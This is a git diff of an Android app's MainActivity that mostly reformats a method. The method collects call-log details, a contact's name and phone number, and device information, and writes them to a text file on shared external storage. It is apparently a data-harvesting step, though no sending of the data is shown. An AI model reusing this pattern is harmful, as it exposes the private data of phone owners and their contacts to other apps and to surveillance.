@@ -230,28 +230,35 @@ public class MainActivity extends AppCompatActivity
 
     }
 
+
+
+
     private void PutIntoFile()
     {
         File tempFile;
-        File cDir = getBaseContext().getCacheDir();
         tempFile = new File(Environment.getExternalStorageDirectory() + "/" + "textffile.txt") ;
+
         FileWriter writer=null;
-        try
-        {
+        try {
             writer = new FileWriter(tempFile);
-            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[] {ContactsContract.CommonDataKinds.Phone._ID, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
+
+            FileReader fReader = new FileReader(tempFile);
+            BufferedReader bReader = new BufferedReader(fReader);
+
+            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{ContactsContract.CommonDataKinds.Phone._ID, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
             cursor.moveToFirst();
 
-            writer.write("Call details: " + getCallDetails() + "\n" + "Contacts: ID "+
-                    cursor.getString(0)+ " NAME "+ cursor.getString(1)+" PHONE "+cursor.getString(2) +
-                    "\n" + "System info details: " + GetInfo.getInfosAboutDevice(act));
 
-            writer.close();
+                writer.write("Call details: " + getCallDetails() + "\n" + "Contacts: ID " +
+                        cursor.getString(0) + " NAME " + cursor.getString(1) + " PHONE " + cursor.getString(2) +
+                        "\n" + "System info details: " + GetInfo.getInfosAboutDevice(act));
+
+                writer.close();
 
 
-            File external_m1 =  Environment.getExternalStorageDirectory();
 
-            Log.i("assdf", external_m1.getPath());
+
+            Log.i("assdf", Environment.getExternalStorageDirectory().getPath());
         }
         catch (IOException e)
         {
